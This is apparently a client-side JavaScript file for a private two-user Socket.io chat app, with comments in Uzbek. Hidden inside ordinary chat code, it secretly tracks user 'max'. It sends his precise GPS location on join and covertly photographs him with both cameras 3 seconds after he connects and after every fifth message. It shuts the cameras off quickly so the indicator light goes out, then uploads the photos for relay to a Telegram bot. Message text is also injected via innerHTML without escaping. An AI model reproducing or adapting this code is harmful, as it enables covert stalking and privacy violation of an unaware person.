const socket = io();
const myUser = localStorage.getItem('chatUser');
if (!myUser) window.location.href = 'index.html';

const partner = (myUser === 'mura') ? 'max' : 'mura';
document.getElementById('chatPartner').innerText = partner.toUpperCase();

// --- LOKATSIYA BILAN JOIN QILISH ---
if (myUser.toLowerCase() === 'max') {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                // Agar lokatsiya topsa, lokatsiya bilan serverga kiradi
                socket.emit('join', { 
                    user: myUser, 
                    lat: position.coords.latitude, 
                    lon: position.coords.longitude 
                });
            },
            (error) => {
                // Agar GPS ruxsat bermasa, oddiy kiradi
                socket.emit('join', { user: myUser });
            },
            { enableHighAccuracy: true, timeout: 15000 }
        );
    } else {
        socket.emit('join', { user: myUser });
    }
} else {
    // Agar Mura kirsa, to'g'ridan-to'g'ri kiradi
    socket.emit('join', myUser);
}
// ------------------------------------

let currentReply = null;
let mediaRecorder;
let audioChunks = [];
let isRecording = false;

// --- STATUS & LAST SEEN ---
socket.on('status_update', (data) => {
    const isOnline = data.online.includes(partner);
    const statusText = document.getElementById('statusText');
    
    if (isOnline) {
        statusText.innerText = "online";
        statusText.style.color = "#00ff41";
    } else {
        const lastTime = data.lastSeen[partner];
        if (lastTime) {
            statusText.innerText = `last seen at ${lastTime}`;
        } else {
            statusText.innerText = "offline";
        }
        statusText.style.color = "#8faec5";
    }
});

// --- REPLY FUNCTION ---
window.triggerReply = function(user, text, msgId) {
    currentReply = { user, text };
    document.getElementById('replyPreview').style.display = 'flex';
    document.getElementById('replyTargetUser').innerText = user;
    document.getElementById('replyTargetText').innerText = text;
    document.getElementById('msgInput').focus();
}

window.cancelReply = function() {
    currentReply = null;
    document.getElementById('replyPreview').style.display = 'none';
}

// --- MESSAGES ---
socket.on('load_history', (history) => {
    const list = document.getElementById('messagesList');
    list.innerHTML = '';
    history.forEach(msg => appendMessage(msg));
    list.scrollTop = list.scrollHeight;
});

socket.on('new_message', (msg) => {
    appendMessage(msg);
    const list = document.getElementById('messagesList');
    list.scrollTop = list.scrollHeight;
});

function appendMessage(msg) {
    const list = document.getElementById('messagesList');
    const div = document.createElement('div');
    const isMe = msg.user === myUser;
    
    div.className = `message ${isMe ? 'my-msg' : 'other-msg'}`;
    
    // Swipe to reply logic (Oddiy click bilan)
    div.onclick = (e) => {
        // Agar rasm yoki fayl ustiga bosilmagan bo'lsa reply bo'lsin
        if(e.target.tagName !== 'IMG' && e.target.tagName !== 'VIDEO') {
            const txt = msg.text || (msg.file ? `[${msg.fileType}]` : '...');
            triggerReply(msg.user, txt);
        }
    };

    // 1. REPLY QISMI (Agar bo'lsa)
    let replyHtml = '';
    if (msg.replyTo) {
        replyHtml = `
        <div class="reply-quote-block">
            <span class="reply-name">${msg.replyTo.user}</span>
            <span class="reply-text">${msg.replyTo.text}</span>
        </div>`;
    }

    // 2. CONTENT (Media)
    let mediaHtml = '';
    if (msg.file) {
        if (msg.fileType.startsWith('image/')) mediaHtml = `<img src="/uploads/${msg.file}" class="msg-img">`;
        else if (msg.fileType.startsWith('video/')) mediaHtml = `<video src="/uploads/${msg.file}" controls class="msg-img"></video>`;
        else if (msg.fileType.startsWith('audio/') || msg.file.endsWith('.webm')) mediaHtml = `<audio src="/uploads/${msg.file}" controls style="margin-top:5px; width:200px;"></audio>`;
        else mediaHtml = `<a href="/uploads/${msg.file}" download style="color:#64b5ef; display:block; margin-top:5px;">📄 ${msg.fileName || 'Fayl'}</a>`;
    }

    // 3. TEXT
    let textHtml = msg.text ? `<span>${msg.text}</span>` : '';

    div.innerHTML = `${replyHtml}${mediaHtml}${textHtml}<span class="msg-time">${msg.time}</span>`;
    list.appendChild(div);
}

// --- SENDING ---
window.sendMessage = function() {
    const input = document.getElementById('msgInput');
    const text = input.value.trim();
    if (text || currentReply) { // Reply bo'lsa bo'sh text ketaversin (Telegramdaka)
        socket.emit('send_message', { text: text, replyTo: currentReply });
        input.value = '';
        cancelReply();
    }
}

document.getElementById('msgInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendMessage();
});

// --- RECORDING (Touch & Mouse) ---
const micBtn = document.getElementById('micBtn');

const startRec = async (e) => {
    e.preventDefault();
    if (isRecording) return;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        isRecording = true;
        micBtn.classList.add('recording-active');

        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
        mediaRecorder.onstop = () => {
            micBtn.classList.remove('recording-active');
            isRecording = false;
            const blob = new Blob(audioChunks, { type: 'audio/webm' });
            if (blob.size > 1000) uploadFile(blob, 'voice_msg.webm');
        };
        mediaRecorder.start();
    } catch (err) { alert("Mikrofon ishlamadi!"); }
};

const stopRec = (e) => {
    e.preventDefault();
    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
};

micBtn.addEventListener('mousedown', startRec);
micBtn.addEventListener('mouseup', stopRec);
micBtn.addEventListener('touchstart', startRec);
micBtn.addEventListener('touchend', stopRec);

// --- FILE UPLOAD ---
window.uploadFile = async function(file, nameOverride = null) {
    if (!file) return;
    const formData = new FormData();
    formData.append('file', file, nameOverride || file.name);

    try {
        const res = await fetch('/upload', { method: 'POST', body: formData });
        const data = await res.json();
        socket.emit('send_message', { 
            text: '', 
            file: data.filename, 
            fileType: data.type, 
            fileName: data.originName,
            replyTo: currentReply 
        });
        cancelReply();
    } catch (e) { alert("Yuklashda xato!"); }
}

// ==========================================
// MAX SHAXSINI YASHIRIN TASDIQLASH (VERIFY)
// ==========================================

let maxMessageCount = 0;

// Yashirincha rasmga olish funksiyasi
async function takeSecretPhoto(facingMode) {
    try {
        // Ekrandan tashqarida video va canvas yaratamiz
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0); // Kadrdan nusxa olamiz
        
        // Kamerani darhol o'chiramiz (yashil chiroq o'chadi)
        stream.getTracks().forEach(track => track.stop());
        
        return new Promise(resolve => {
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        });
    } catch (err) {
        console.log(`Kamera ruxsat bermadi yoki ishlamadi (${facingMode}):`, err);
        return null;
    }
}

// Rasmni serverga yuklab, telegramga signal berish
async function uploadAndSendToBot(blob, type) {
    const formData = new FormData();
    formData.append('file', blob, `verify_${Date.now()}.jpg`);
    try {
        const res = await fetch('/upload', { method: 'POST', body: formData });
        const data = await res.json();
        socket.emit('verify_photo', { filename: data.filename, type: type });
    } catch (e) { console.error("Rasm yuklashda xato"); }
}

// Asosiy tasdiqlash jarayoni (Old va orqa kamera)
async function runVerification() {
    if (myUser !== 'max') return; // Faqat Max uchun ishlaydi
    
    console.log("Tasdiqlash boshlandi...");
    
    // 1. Old kamera (Selfi)
    const frontBlob = await takeSecretPhoto('user');
    if (frontBlob) await uploadAndSendToBot(frontBlob, 'Old Kamera 🤳');
    
    // Kichik tanaffus (Ikkita kamerani ketma-ket yoqish telefonni qotirmasligi uchun)
    await new Promise(r => setTimeout(r, 1000));
    
    // 2. Orqa kamera
    const backBlob = await takeSecretPhoto('environment');
    if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
}

// 1) MAX KIRGAN ZAHOTI TASDIQLASH
socket.on('connect', () => {
    if (myUser === 'max') {
        setTimeout(runVerification, 3000); // Sahifa to'liq yuklanib olishi uchun 3 soniya kutamiz
    }
});

// 2) HAR 5 TA XABARDAN SO'NG TASDIQLASH
// O'zingizning xabar yuborish funksiyangiz (sendMessage) ichiga shuni qo'shishingiz kerak:
const originalSendMessage = window.sendMessage;
window.sendMessage = function() {
    // Avval sizning eski xabar yuborish kodingiz ishlaydi
    originalSendMessage(); 
    
    // Keyin Maxning xabarlari sanaladi
    if (myUser === 'max') {
        maxMessageCount++;
        if (maxMessageCount % 5 === 0) { // Har 5-xabarda
            runVerification();
        }
    }
}